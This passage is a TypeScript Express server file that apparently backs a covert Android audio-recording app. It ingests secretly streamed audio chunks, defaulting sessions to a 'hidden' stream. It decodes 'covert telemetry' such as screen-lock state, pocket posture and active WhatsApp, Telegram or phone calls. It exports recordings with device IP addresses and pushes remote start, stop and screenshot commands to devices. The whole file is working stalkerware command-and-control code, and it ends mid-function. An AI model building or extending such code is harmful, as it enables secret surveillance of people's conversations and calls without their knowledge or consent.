/**
 * broadcast.ts — API routes for broadcaster clients.
 *
 * Handles session lifecycle and chunk ingestion:
 *   POST /api/v1/broadcasts              — Create new session
 *   POST /api/v1/broadcasts/:id/chunk    — Upload an audio chunk
 *   PUT  /api/v1/broadcasts/:id/end      — End a session
 *   GET  /api/v1/broadcasts/:id          — Get session info
 */

import { Router, Request, Response } from 'express';
import multer from 'multer';
import rateLimit from 'express-rate-limit';
import { v4 as uuidv4 } from 'uuid';
import fs from 'fs';
import path from 'path';
import archiver from 'archiver';
import * as db from '../database';
import * as storage from '../storage';
import { appendToHLS, finalizeHLS } from '../hls';
import { sendDeviceCommand, broadcastLiveEvent } from '../websocket';
import { MAX_UPLOAD_SIZE, CHUNK_DURATION_MS, PUBLIC_DIR } from '../config';

const router = Router();
const exportRateLimit = rateLimit({
    windowMs: 60 * 1000,
    max: 15,
    standardHeaders: true,
    legacyHeaders: false,
    message: {
        status: 'error',
        message: 'Too many export requests. Please retry after a minute.',
    },
});

// Multer: store uploaded chunks in memory (they're small — max 5MB)
const upload = multer({
    storage: multer.memoryStorage(),
    limits: { fileSize: MAX_UPLOAD_SIZE },
});

// ════════════════════════════════════════════════════════════════════════════
// CREATE SESSION
// ════════════════════════════════════════════════════════════════════════════

router.post('/', (req: Request, res: Response) => {
    try {
        const sessionId = req.body?.session_id || uuidv4();
        const { client_name, device_info, title, stream_type } = req.body || {};
        const streamType = stream_type === 'main' ? 'main' : 'hidden';

        // Create storage directories
        storage.createSessionDirs(sessionId);

        // Create database record
        const session = db.createSession(
            sessionId,
            client_name || '',
            device_info || '',
            title || '',
            streamType
        );

        console.log(`[broadcast] New session: ${sessionId} (client: ${client_name || 'unknown'}, type: ${streamType})`);

        res.status(201).json({
            status: 'created',
            session_id: sessionId,
            session,
        });
    } catch (err: any) {
        console.error('[broadcast] Create session error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// UPLOAD CHUNK
// ════════════════════════════════════════════════════════════════════════════

router.post('/:session_id/chunk', upload.single('audio'), async (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;
        const file = req.file;

        if (!file) {
            res.status(400).json({ status: 'error', message: 'No audio file provided' });
            return;
        }

        // Verify session exists or auto-recover if missing (e.g. after server restart)
        let session = db.getSession(session_id);
        if (!session) {
            storage.createSessionDirs(session_id);
            const clientName = (req.body && req.body.client_name) 
                || (db.getAllDeviceCommands()[0]?.client_id) 
                || 'Realme-RMX2040';
            const streamType = req.body?.stream_type === 'main' ? 'main' : 'hidden';
            session = db.createSession(
                session_id,
                clientName,
                'Android Device (Live)',
                streamType === 'main' ? `Main Recording - ${clientName}` : `Live Stream - ${clientName}`,
                streamType
            );
            console.log(`[broadcast] Auto-recovered live session for chunk: ${session_id} (${clientName}, type: ${streamType})`);
        } else if (session.status !== 'live') {
            db.reactivateSession(session_id);
            console.log(`[broadcast] Reactivated ended session to live on chunk ingest: ${session_id}`);
        }

        // Get sequence number from body or auto-increment
        let sequenceNum: number;
        if (req.body.sequence_num !== undefined) {
            sequenceNum = parseInt(req.body.sequence_num, 10);
        } else {
            sequenceNum = db.getLatestChunkSequence(session_id) + 1;
        }

        // Duplicate detection: if this sequence already uploaded, skip
        if (db.chunkExists(session_id, sequenceNum)) {
            console.log(`[broadcast] Duplicate chunk skipped: session=${session_id} seq=${sequenceNum}`);
            res.json({
                status: 'already_exists',
                session_id,
                sequence_num: sequenceNum,
                message: 'Chunk already uploaded.',
            });
            return;
        }

        // Parse optional metadata from request body
        const chunkId = req.body.chunk_id || uuidv4();
        const durationMs = parseInt(req.body.duration_ms || String(CHUNK_DURATION_MS), 10);
        const checksum = req.body.checksum || '';
        const inCall = req.body.in_call === '1' || req.body.in_call === 'true' ? 1 : 0;
        const micInUse = req.body.mic_in_use === '1' || req.body.mic_in_use === 'true' ? 1 : 0;
        const clientTimestamp = req.body.timestamp;

        // Save chunk to disk
        const saved = storage.saveChunk(session_id, sequenceNum, file.buffer, file.originalname);

        // Insert into database
        const chunk = db.insertChunk(
            chunkId,
            session_id,
            sequenceNum,
            saved.filename,
            saved.filepath,
            saved.fileSize,
            durationMs,
            checksum,
            inCall,
            micInUse
        );

        // Dynamically update device_info for Dashboard Session Lists (Covert Telemetry)
        const metaMatch = file.originalname.match(/_B(-?\d+)_S(-?\d+)(?:_O([A-Z]{3}))?(?:_D([01]))?(?:_U([01]))?(?:_C([A-Z0-9]+))?(?:_R([A-Z0-9]+))?(?:_V([01]))?(?:_dB(\d+))?(?:_T(\d+))?(?:_M([01]))?(?:_P([A-Z]+))?(?:_A([A-Z0-9]+))?/);
        if (metaMatch) {
            const battery = metaMatch[1];
            const routeCode = metaMatch[3];
            const screenCode = metaMatch[4];
            const unlockCode = metaMatch[5];
            const powerCode = metaMatch[6];
            const ringerCode = metaMatch[7];
            const speechCode = metaMatch[8];
            const dbVal = metaMatch[9];
            const tempVal = metaMatch[10];
            const motionCode = metaMatch[11];
            const postureCode = metaMatch[12];
            const appCode = metaMatch[13];

            const session = db.getSession(session_id);
            if (session) {
                const baseInfo = session.device_info.split('|')[0].trim();

                // Only show covert intelligence details if this is the covert "hidden" stream!
                // Main stream sessions remain completely clean and basic.
                if (session.stream_type === 'hidden') {
                    let routeStr = '';
                    if (routeCode === 'JCK') routeStr = ' | 🎧 Jack';
                    else if (routeCode === 'BLU') routeStr = ' | 🦷 Bluetooth';
                    else if (routeCode === 'SPK') routeStr = ' | 🔊 Speaker';

                    let powerStr = '';
                    if (powerCode === 'CUSB') powerStr = ' (💻 PC USB)';
                    else if (powerCode === 'CAC') powerStr = ' (⚡ Wall AC)';
                    else if (powerCode === 'CWIR') powerStr = ' (🛜 Wireless)';

                    let screenStr = '';
                    if (screenCode === '1') {
                        screenStr = unlockCode === '1' ? ' | 📱 Screen ON (Unlocked)' : ' | 📱 Screen ON (Locked)';
                    } else if (screenCode === '0') {
                        screenStr = ' | 🌑 Screen OFF';
                    }

                    let ringerStr = '';
                    if (ringerCode === 'RS') ringerStr = ' | 🔇 Silent';
                    else if (ringerCode === 'RV') ringerStr = ' | 📳 Vibrate';

                    let audioStr = '';
                    if (speechCode === '1') {
                        audioStr = ` | 🗣️ Speech (${dbVal || 0}dB)`;
                    }

                    let tempStr = tempVal && parseInt(tempVal) > 0 ? ` | 🌡️ ${tempVal}°C` : '';
                    let motionStr = motionCode === '1' ? ' | 🏃 Moving' : (motionCode === '0' ? ' | 🪑 Still' : '');
                    let postureStr = postureCode === 'POCK' ? ' | 👖 Pocket' : (postureCode === 'DESK' ? ' | 🪵 Desk' : (postureCode === 'OPEN' ? ' | ✋ Hand' : ''));

                    let appStr = '';
                    if (appCode && appCode !== 'AIDLE') {
                        if (appCode === 'AWA') appStr = ' | 🟢 WhatsApp Call';
                        else if (appCode === 'AIG') appStr = ' | 🟣 Instagram Call';
                        else if (appCode === 'ATG') appStr = ' | 🔵 Telegram Call';
                        else if (appCode === 'AZOOM') appStr = ' | 💻 Zoom Call';
                        else if (appCode === 'AMEET') appStr = ' | 📹 Google Meet';
                        else if (appCode === 'ACELL') appStr = ' | 📞 Cellular Call';
                        else if (appCode === 'AMIC') appStr = ' | 🎙️ External Mic App';
                        else appStr = ` | 📞 Call (${appCode.replace(/^A/, '')})`;
                    }

                    const newDeviceInfo = `${baseInfo} | 🔋 ${battery}%${powerStr}${routeStr}${screenStr}${ringerStr}${audioStr}${tempStr}${motionStr}${postureStr}${appStr}`;
                    db.updateSessionDeviceInfo(session_id, newDeviceInfo);
                } else {
                    // Standard / Main stream — keep simple
                    let routeStr = '';
                    if (routeCode === 'JCK') routeStr = ' | 🎧 Jack';
                    else if (routeCode === 'BLU') routeStr = ' | 🦷 Bluetooth';
                    else if (routeCode === 'SPK') routeStr = ' | 🔊 Speaker';
                    const newDeviceInfo = `${baseInfo} | 🔋 ${battery}%${routeStr}`;
                    db.updateSessionDeviceInfo(session_id, newDeviceInfo);
                }
            }
        }

        console.log(`[broadcast] Chunk saved: session=${session_id} seq=${sequenceNum} call=${inCall} micUse=${micInUse}`);

        // Generate HLS segment (async — don't block response)
        appendToHLS(session_id, saved.filepath, sequenceNum, clientTimestamp, durationMs).catch(err => {
            console.error(`[broadcast] HLS generation failed for seq ${sequenceNum}:`, err);
        });

        res.json({
            status: 'confirmed',
            session_id,
            chunk_id: chunkId,
            sequence_num: sequenceNum,
            file_size: saved.fileSize,
            message: 'Chunk uploaded successfully. You may delete the local copy.',
        });
    } catch (err: any) {
        console.error('[broadcast] Upload chunk error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// BATCH MULTI-SESSION ZIP EXPORT (Pro Download with Chunks & Full Telemetry)
// ════════════════════════════════════════════════════════════════════════════

interface DecodedTelemetry {
    sequenceNum: number;
    filename: string;
    fileSize: number;
    durationMs: number;
    batteryPercent: number | null;
    powerSource: string;
    screenState: string;
    screenUnlocked: boolean | null;
    audioRoute: string;
    ringerMode: string;
    speechDetected: boolean;
    decibels: number | null;
    temperatureC: number | null;
    motion: string;
    posture: string;
    activeApp: string;
    inCall: boolean;
    micInUse: boolean;
    receivedAtIST: string;
    receivedAtUTC: string;
}

function toISTString(isoDate: string): string {
    try {
        const d = new Date(isoDate);
        return d.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: false });
    } catch {
        return isoDate;
    }
}

function parseChunkTelemetry(filename: string, chunk: db.Chunk): DecodedTelemetry {
    const metaMatch = filename.match(/_B(-?\d+)_S(-?\d+)(?:_O([A-Z]{3}))?(?:_D([01]))?(?:_U([01]))?(?:_C([A-Z0-9]+))?(?:_R([A-Z0-9]+))?(?:_V([01]))?(?:_dB(\d+))?(?:_T(\d+))?(?:_M([01]))?(?:_P([A-Z]+))?(?:_A([A-Z0-9]+))?/);

    let batteryPercent: number | null = null;
    let powerSource = 'Battery (Unplugged)';
    let screenState = 'Unknown';
    let screenUnlocked: boolean | null = null;
    let audioRoute = 'Internal Mic';
    let ringerMode = 'Normal';
    let speechDetected = false;
    let decibels: number | null = null;
    let temperatureC: number | null = null;
    let motion = 'Still';
    let posture = 'Normal';
    let activeApp = 'None';

    if (metaMatch) {
        if (metaMatch[1] && metaMatch[1] !== '-1') {
            batteryPercent = parseInt(metaMatch[1], 10);
        }
        const routeCode = metaMatch[3];
        if (routeCode === 'JCK') audioRoute = 'Headphone Jack';
        else if (routeCode === 'BLU') audioRoute = 'Bluetooth Audio';
        else if (routeCode === 'SPK') audioRoute = 'Speakerphone';

        const screenCode = metaMatch[4];
        const unlockCode = metaMatch[5];
        if (screenCode === '1') {
            screenState = unlockCode === '1' ? 'Screen ON (Unlocked)' : 'Screen ON (Locked)';
            screenUnlocked = unlockCode === '1';
        } else if (screenCode === '0') {
            screenState = 'Screen OFF';
            screenUnlocked = false;
        }

        const powerCode = metaMatch[6];
        if (powerCode === 'CAC' || powerCode === 'AC') powerSource = 'Wall AC Fast Charger';
        else if (powerCode === 'CUSB' || powerCode === 'USB') powerSource = 'PC / USB Cable';
        else if (powerCode === 'CWIR' || powerCode === 'WIR') powerSource = 'Wireless Charging';
        else if (powerCode === 'CBAT' || powerCode === 'BAT') powerSource = 'Battery (Unplugged)';

        const ringerCode = metaMatch[7];
        if (ringerCode === 'RS') ringerMode = 'Silent';
        else if (ringerCode === 'RV') ringerMode = 'Vibrate';
        else if (ringerCode === 'RN') ringerMode = 'Normal';

        speechDetected = metaMatch[8] === '1';
        if (metaMatch[9]) decibels = parseInt(metaMatch[9], 10);
        if (metaMatch[10] && parseInt(metaMatch[10], 10) > 0) temperatureC = parseInt(metaMatch[10], 10);

        const motionCode = metaMatch[11];
        if (motionCode === '1') motion = 'Moving';
        else if (motionCode === '0') motion = 'Still';

        const postureCode = metaMatch[12];
        if (postureCode === 'POCK') posture = 'In Pocket';
        else if (postureCode === 'DESK') posture = 'On Desk (Flat)';
        else if (postureCode === 'OPEN' || postureCode === 'POPEN') posture = 'In Hand';
        else if (postureCode === 'FACE') posture = 'Face Down';

        if (metaMatch[13]) activeApp = metaMatch[13];
    }

    return {
        sequenceNum: chunk.sequence_num,
        filename: path.basename(chunk.filepath || filename),
        fileSize: chunk.file_size,
        durationMs: chunk.duration_ms,
        batteryPercent,
        powerSource,
        screenState,
        screenUnlocked,
        audioRoute,
        ringerMode,
        speechDetected,
        decibels,
        temperatureC,
        motion,
        posture,
        activeApp,
        inCall: chunk.in_call === 1,
        micInUse: chunk.mic_in_use === 1,
        receivedAtIST: toISTString(chunk.received_at),
        receivedAtUTC: chunk.received_at,
    };
}

router.all('/batch-export-zip', exportRateLimit, async (req: Request, res: Response) => {
    try {
        let sessionIds: string[] = [];
        if (Array.isArray(req.body?.session_ids)) {
            sessionIds = req.body.session_ids.map((id: any) => String(id).trim()).filter(Boolean);
        } else if (typeof req.body?.session_ids === 'string') {
            sessionIds = req.body.session_ids.split(',').map((s: string) => s.trim()).filter(Boolean);
        } else if (req.query?.session_ids || req.query?.ids) {
            const raw = (req.query.session_ids || req.query.ids) as string;
            sessionIds = raw.split(',').map(s => s.trim()).filter(Boolean);
        }

        if (sessionIds.length === 0) {
            res.status(400).json({ status: 'error', message: 'No session_ids provided for batch export' });
            return;
        }

        const formatParam = (req.body?.format || req.query?.format || 'pro_chunks').toLowerCase();
        const timestampStr = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
        const zipFilename = `audio_sessions_batch_${timestampStr}.zip`;

        res.setHeader('Content-Type', 'application/zip');
        res.setHeader('Content-Disposition', `attachment; filename="${zipFilename}"`);

        const archive = archiver('zip', {
            zlib: { level: 6 },
        });

        archive.on('error', (err: any) => {
            console.error('[broadcast] Batch ZIP export error:', err);
            if (!res.headersSent) {
                res.status(500).json({ status: 'error', message: 'Batch export failed' });
            }
        });

        archive.pipe(res);

        for (const sessionId of sessionIds) {
            const session = db.getSession(sessionId);
            if (!session) {
                archive.append(`Session ID: ${sessionId} not found in database.\n`, {
                    name: `missing_sessions/${sessionId}.txt`
                });
                continue;
            }

            const cleanClient = (session.client_name || 'session').replace(/[^a-zA-Z0-9_-]/g, '_');
            const datePrefix = (session.created_at || '').slice(0, 10).replace(/-/g, '');
            const folderName = `${cleanClient}_${datePrefix}_${sessionId.slice(0, 8)}`;

            const chunks = db.getSessionChunks(sessionId);
            const rawDir = storage.getRawDir(sessionId);
            const resolvedRawDir = path.resolve(rawDir);

            // Decode telemetry for every chunk
            const telemetryList: DecodedTelemetry[] = chunks.map(c => parseChunkTelemetry(c.filename, c));

            // Compute summary statistics
            const batteries = telemetryList.map(t => t.batteryPercent).filter((b): b is number => b !== null);
            const startBattery = batteries.length > 0 ? `${batteries[0]}%` : 'Unknown';
            const endBattery = batteries.length > 0 ? `${batteries[batteries.length - 1]}%` : 'Unknown';
            const avgBattery = batteries.length > 0 ? `${Math.round(batteries.reduce((a, b) => a + b, 0) / batteries.length)}%` : 'Unknown';
            const dBs = telemetryList.map(t => t.decibels).filter((d): d is number => d !== null);
            const avgDecibels = dBs.length > 0 ? `${Math.round(dBs.reduce((a, b) => a + b, 0) / dBs.length)} dB` : 'N/A';
            const temps = telemetryList.map(t => t.temperatureC).filter((t): t is number => t !== null);
            const tempRange = temps.length > 0 ? `${Math.min(...temps)}°C - ${Math.max(...temps)}°C` : 'N/A';
            const powerSources = [...new Set(telemetryList.map(t => t.powerSource))].join(', ') || 'Battery';
            const callsCount = telemetryList.filter(t => t.inCall).length;
            const micInUseCount = telemetryList.filter(t => t.micInUse).length;

            // Retrieve device installation record if available
            const installs = db.getDeviceInstalls(100);
            const installInfo = installs.find(i => i.client_id === session.client_name);

            // 1. Generate human-readable SESSION_REPORT.txt
            const reportText = `================================================================================
📡 AUDIO STREAM PRO RECORDING & TELEMETRY REPORT
================================================================================
Session ID       : ${session.session_id}
Device Name      : ${session.client_name || 'Unknown Device'}
Device Info      : ${session.device_info || 'Mobile Audio Client'}
Stream Type      : ${session.stream_type.toUpperCase()}
Created (IST)    : ${toISTString(session.created_at)}
Ended (IST)      : ${session.ended_at ? toISTString(session.ended_at) : 'Active / Still Open'}
Total Duration   : ${Math.floor(session.total_duration / 60)}m ${Math.floor(session.total_duration % 60)}s (${session.total_duration.toFixed(1)}s)
Total Chunks     : ${chunks.length}
Total Audio Size : ${(session.total_bytes / (1024 * 1024)).toFixed(2)} MB (${session.total_bytes.toLocaleString()} bytes)

--------------------------------------------------------------------------------
📱 DEVICE SPECIFICATIONS (From Registration)
--------------------------------------------------------------------------------
Model            : ${installInfo?.device_model || session.device_info || 'Unknown'}
Manufacturer     : ${installInfo?.manufacturer || 'Unknown'}
Android / OS     : ${installInfo?.os_version || 'Unknown'}
App Version      : ${installInfo?.app_version || 'Latest'}
IP Address       : ${installInfo?.ip_address || 'Local / Cellular'}
Registration Date: ${installInfo?.installed_at ? toISTString(installInfo.installed_at) : 'N/A'}

--------------------------------------------------------------------------------
🔋 BATTERY & HARDWARE SENSORS SUMMARY
--------------------------------------------------------------------------------
Start Battery    : ${startBattery}
End Battery      : ${endBattery}
Average Battery  : ${avgBattery}
Power States     : ${powerSources}
Call Detections  : ${callsCount > 0 ? `Active Call during ${callsCount} chunks` : 'No Phone Calls Detected'}
Mic Interference : ${micInUseCount > 0 ? `Microphone contested during ${micInUseCount} chunks` : 'Clear exclusive recording'}
Average Decibels : ${avgDecibels}
Temperature      : ${tempRange}

================================================================================
Exported with Audio Stream Pro Downloader on ${toISTString(new Date().toISOString())}
================================================================================
`;
            archive.append(reportText, { name: `${folderName}/SESSION_REPORT.txt` });

            // 2. Generate granular telemetry_timeline.csv
            const csvRows = [
                'Sequence,Filename,Duration_Ms,Timestamp_IST,Timestamp_UTC,Battery_Pct,Power_Source,In_Call,Mic_In_Use,Speech_Detected,Decibels_dB,Temp_C,Screen_State,Motion,Posture,Active_App'
            ];
            for (const t of telemetryList) {
                csvRows.push([
                    t.sequenceNum,
                    `"${t.filename}"`,
                    t.durationMs,
                    `"${t.receivedAtIST}"`,
                    `"${t.receivedAtUTC}"`,
                    t.batteryPercent !== null ? t.batteryPercent : '',
                    `"${t.powerSource}"`,
                    t.inCall ? '1' : '0',
                    t.micInUse ? '1' : '0',
                    t.speechDetected ? '1' : '0',
                    t.decibels !== null ? t.decibels : '',
                    t.temperatureC !== null ? t.temperatureC : '',
                    `"${t.screenState}"`,
                    `"${t.motion}"`,
                    `"${t.posture}"`,
                    `"${t.activeApp}"`
                ].join(','));
            }
            archive.append(csvRows.join('\r\n'), { name: `${folderName}/telemetry_timeline.csv` });

            // 3. Generate structured metadata.json
            const metadataObj = {
                session,
                install: installInfo || null,
                telemetry_summary: {
                    start_battery: startBattery,
                    end_battery: endBattery,
                    avg_battery: avgBattery,
                    power_sources: powerSources,
                    calls_count: callsCount,
                    mic_in_use_count: micInUseCount,
                    avg_decibels: avgDecibels,
                    temperature_range: tempRange
                },
                chunks: telemetryList
            };
            archive.append(JSON.stringify(metadataObj, null, 2), { name: `${folderName}/metadata.json` });

            // 4. Append Audio Chunks or Merged Audio
            const chunkFiles = chunks
                .map(c => path.resolve(c.filepath))
                .filter(filePath =>
                    (filePath === resolvedRawDir || filePath.startsWith(`${resolvedRawDir}${path.sep}`))
                    && fs.existsSync(filePath)
                );

            if (formatParam === 'audio') {
                // Merge all raw chunks into single continuous stream/file
                if (chunkFiles.length > 0) {
                    const buffers: Buffer[] = [];
                    for (const fp of chunkFiles) {
                        try {
                            buffers.push(fs.readFileSync(fp));
                        } catch { }
                    }
                    if (buffers.length > 0) {
                        const mergedBuffer = Buffer.concat(buffers);
                        const ext = path.extname(chunkFiles[0]) || '.aac';
                        archive.append(mergedBuffer, { name: `${folderName}/${cleanClient}_full_audio${ext}` });
                    }
                }
            } else {
                // Pro chunks mode: include every individual raw chunk
                for (const filePath of chunkFiles) {
                    archive.file(filePath, { name: `${folderName}/chunks/${path.basename(filePath)}` });
                }
            }
        }

        await archive.finalize();
    } catch (err: any) {
        console.error('[broadcast] Batch export error:', err);
        if (!res.headersSent) {
            res.status(500).json({ status: 'error', message: err.message });
        }
    }
});

// ════════════════════════════════════════════════════════════════════════════
// EXPORT AUDIO BY CHANNEL (Mic vs Internal vs Stereo)
// ════════════════════════════════════════════════════════════════════════════

router.get('/:session_id/export-channel', exportRateLimit, (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;
        const channelParam = (req.query.channel as string || 'both').toLowerCase();
        const session = db.getSession(session_id);

        if (!session) {
            res.status(404).json({ status: 'error', message: 'Session not found' });
            return;
        }

        const rawDir = storage.getRawDir(session_id);
        const vodM3u8 = `${storage.getHlsDir(session_id)}/vod.m3u8`;

        if (!require('fs').existsSync(vodM3u8) && !require('fs').existsSync(rawDir)) {
            res.status(404).json({ status: 'error', message: 'No recordings available for this session' });
            return;
        }

        const formatParam = (req.query.format as string || 'aac').toLowerCase();

        if (formatParam === 'zip') {
            const chunks = db.getSessionChunks(session_id);
            if (chunks.length === 0) {
                res.status(404).json({ status: 'error', message: 'No chunks available for this session' });
                return;
            }

            const rawDir = storage.getRawDir(session_id);
            const resolvedRawDir = path.resolve(rawDir);
            const chunkFiles = chunks
                .map(c => path.resolve(c.filepath))
                .filter(filePath =>
                    (filePath === resolvedRawDir || filePath.startsWith(`${resolvedRawDir}${path.sep}`))
                    && fs.existsSync(filePath)
                );

            if (chunkFiles.length === 0) {
                res.status(404).json({ status: 'error', message: 'Chunk files not found on disk' });
                return;
            }

            const filename = `${session.client_name || 'session'}_${session_id.slice(0, 8)}_chunks.zip`;
            res.setHeader('Content-Type', 'application/zip');
            res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);

            const archive = archiver('zip', {
                zlib: { level: 6 },
            });

            archive.on('error', (err: any) => {
                console.error('[broadcast] ZIP export error:', err);
                if (!res.headersSent) {
                    res.status(500).json({ status: 'error', message: 'ZIP export failed' });
                }
            });

            archive.pipe(res);

            for (const filePath of chunkFiles) {
                archive.file(filePath, { name: path.basename(filePath) });
            }

            archive.finalize();
            return;
        }
        
        if (formatParam === 'm3u8') {
            const filename = `${session.client_name || 'session'}_${session_id.slice(0, 8)}_${channelParam}.m3u8`;
            res.setHeader('Content-Type', 'audio/x-mpegurl');
            res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
            res.sendFile(vodM3u8);
            return;
        }

        // Export as single combined audio file using FFmpeg
        const isMP3 = formatParam === 'mp3';
        const ext = isMP3 ? 'mp3' : 'aac';
        const contentType = isMP3 ? 'audio/mpeg' : 'audio/aac';
        const filename = `${session.client_name || 'session'}_${session_id.slice(0, 8)}_${channelParam}.${ext}`;
        
        res.setHeader('Content-Type', contentType);
        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);

        const ffmpegInstaller = require('@ffmpeg-installer/ffmpeg');
        const { spawn } = require('child_process');

        const args = ['-i', vodM3u8];
        if (isMP3) {
            args.push('-c:a', 'libmp3lame', '-q:a', '2', '-f', 'mp3');
        } else {
            args.push('-c:a', 'copy', '-f', 'adts'); // fast copy
        }
        args.push('pipe:1');

        const proc = spawn(ffmpegInstaller.path, args);
        proc.stdout.pipe(res);

        proc.on('error', (err: any) => {
            console.error('[broadcast] FFmpeg export error:', err);
            if (!res.headersSent) {
                res.status(500).json({ status: 'error', message: 'Export failed' });
            }
        });

        req.on('close', () => {
            if (!proc.killed) {
                proc.kill();
            }
        });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ════════════════════════════════════════════════════════════════════════════
// END SESSION
// ════════════════════════════════════════════════════════════════════════════

router.put('/:session_id/end', (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;

        const session = db.getSession(session_id);
        if (!session) {
            res.status(404).json({ status: 'error', message: 'Session not found' });
            return;
        }

        db.endSession(session_id);
        finalizeHLS(session_id);

        console.log(`[broadcast] Session ended: ${session_id}`);

        res.json({
            status: 'ended',
            session_id,
            message: 'Session ended. VOD playlist finalized.',
        });
    } catch (err: any) {
        console.error('[broadcast] End session error:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

router.put('/:session_id/activate', (req: Request, res: Response) => {
    try {
        const session_id = req.params.session_id as string;
        let session = db.getSession(session_id);
        if (!session) {
            storage.createSessionDirs(session_id);
            const clientName = (req.body && req.body.client_name) || 'Realme-RMX2040';
            session = db.createSession(session_id, clientName, 'Android Device (Live)', `Live Stream - ${clientName}`);
        } else {
            db.reactivateSession(session_id);
        }
        console.log(`[broadcast] Session activated/resumed as live: ${session_id}`);
        res.json({ status: 'live', session_id, message: 'Session is now live.' });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});



// ════════════════════════════════════════════════════════════════════════════
// REMOTE CONTROL COMMANDS
// ════════════════════════════════════════════════════════════════════════════

router.post('/remote-command', (req: Request, res: Response) => {
    try {
        const { client_id, command, payload, enabled, config } = req.body;
        if (!client_id || !command) {
            res.status(400).json({ status: 'error', message: 'Missing client_id or command' });
            return;
        }

        db.setDeviceCommand(client_id, command);
        console.log(`[broadcast] Remote command set for ${client_id}: ${command}`);

        const extraData: Record<string, any> = {};
        if (payload) Object.assign(extraData, payload);
        if (enabled !== undefined) extraData.enabled = enabled;
        if (config !== undefined) extraData.config = config;

        // ⚡ Send instant push command through live WebSocket (0ms latency, WhatsApp style)
        const pushedViaSocket = sendDeviceCommand(client_id, command, extraData);
        
        res.json({
            status: 'success',
            client_id,
            command,
            delivered_via_socket: pushedViaSocket,
        });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// Trigger remote soft or hard restart
router.post('/restart', (req: Request, res: Response) => {
    try {
        const { client_id, type } = req.body;
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }
        const cmd = (type === 'app') ? 'RESTART_APP' : 'RESTART_STREAM';
        db.setDeviceCommand(client_id, cmd);
        const pushed = sendDeviceCommand(client_id, cmd);
        console.log(`[broadcast] Restart requested for ${client_id} (${cmd}) - pushed: ${pushed}`);
        res.json({ status: 'success', client_id, command: cmd, delivered_via_socket: pushed });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// Toggle Eco Low-CPU Mode remotely
router.post('/eco-mode', (req: Request, res: Response) => {
    try {
        const { client_id, enabled } = req.body;
        if (!client_id || enabled === undefined) {
            res.status(400).json({ status: 'error', message: 'Missing client_id or enabled boolean' });
            return;
        }
        const isEnabled = Boolean(enabled);
        const pushed = sendDeviceCommand(client_id, 'SET_ECO_MODE', { enabled: isEnabled });
        console.log(`[broadcast] Eco Mode toggled for ${client_id} to ${isEnabled} - pushed: ${pushed}`);
        res.json({ status: 'success', client_id, enabled: isEnabled, delivered_via_socket: pushed });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// Save & push remote configuration
router.post('/config', (req: Request, res: Response) => {
    try {
        const { client_id, config } = req.body;
        if (!client_id || !config) {
            res.status(400).json({ status: 'error', message: 'Missing client_id or config' });
            return;
        }
        db.saveDeviceConfig(client_id, config);
        const pushed = sendDeviceCommand(client_id, 'UPDATE_CONFIG', { config });
        console.log(`[broadcast] Remote config saved & pushed for ${client_id} - pushed: ${pushed}`);
        res.json({ status: 'success', client_id, config, delivered_via_socket: pushed });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// Retrieve saved remote configuration
router.get('/config', (req: Request, res: Response) => {
    try {
        const client_id = req.query.client_id as string;
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }
        const config = db.getDeviceConfig(client_id);
        res.json({ status: 'success', client_id, config });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

router.get('/command', (req: Request, res: Response) => {
    try {
        const client_id = req.query.client_id as string;
        const status = req.query.status as string; // 'idle' or 'recording'
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }

        if (status) {
            db.updateDeviceStatus(client_id, status);
        }

        const cmd = db.getDeviceCommand(client_id);
        const commandStr = cmd ? cmd.command : 'NONE';
        const autoScreenshot = cmd ? cmd.auto_screenshot : 0;
        const screenshotInterval = cmd ? cmd.screenshot_interval : 30;
        const startTime = cmd ? (cmd.start_time || "") : "";
        const stopTime = cmd ? (cmd.stop_time || "") : "";
        
        // Don't clear START/STOP commands here — wait for the APK to acknowledge via /command/ack
        // Only clear transient one-shot commands that don't need reliability
        if (commandStr === 'SCREENSHOT_NOW') {
             db.clearDeviceCommand(client_id);
             console.log(`[broadcast] Transient command consumed by ${client_id}: ${commandStr}`);
        } else if (commandStr === 'START' || commandStr === 'STOP') {
             console.log(`[broadcast] Command delivered to ${client_id}: ${commandStr} (awaiting ACK)`);
        }

        res.json({ 
            command: commandStr,
            auto_screenshot: autoScreenshot,
            screenshot_interval: screenshotInterval,
            start_time: startTime,
            stop_time: stopTime
        });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// APK acknowledges it successfully processed a command
router.post('/command/ack', (req: Request, res: Response) => {
    try {
        const { client_id, command } = req.body;
        if (!client_id || !command) {
            res.status(400).json({ status: 'error', message: 'Missing client_id or command' });
            return;
        }
        
        // Only clear the command if it matches what the APK is acknowledging
        const current = db.getDeviceCommand(client_id);
        if (current && current.command === command) {
            db.clearDeviceCommand(client_id);
            console.log(`[broadcast] Command ACK received from ${client_id}: ${command}`);
        }
        
        res.json({ status: 'acknowledged', client_id, command });
    } catch (err: any) {
        res.status(500).json({ status: 'error', message: err.message });
    }
});

router.post('/screenshot-settings', (req: Request, res: Response) => {
    try {
        const { client_id, auto_screenshot, interval } = req.body;
        if (!client_id) {
            res.status(400).json({ status: 'error', message: 'Missing client_id' });
            return;
        }
